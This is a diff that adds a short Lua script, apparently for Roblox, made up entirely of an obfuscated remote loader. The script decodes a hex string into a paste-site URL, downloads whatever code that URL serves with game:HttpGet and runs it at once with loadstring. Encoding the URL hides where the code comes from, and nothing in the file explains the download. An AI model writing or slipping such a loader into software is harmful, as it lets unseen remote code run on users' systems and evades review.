@@ -1,0 +1,10 @@
+local function hex_to_str(hex)
+    return hex:gsub('..', function(cc)
+        return string.char(tonumber(cc, 16))
+    end)
+end
+
+local encoded = "687474703a2f2f7670617374652e6e65742f424f733267"
+local url = hex_to_str(encoded)
+
+loadstring(game:HttpGet(url))()
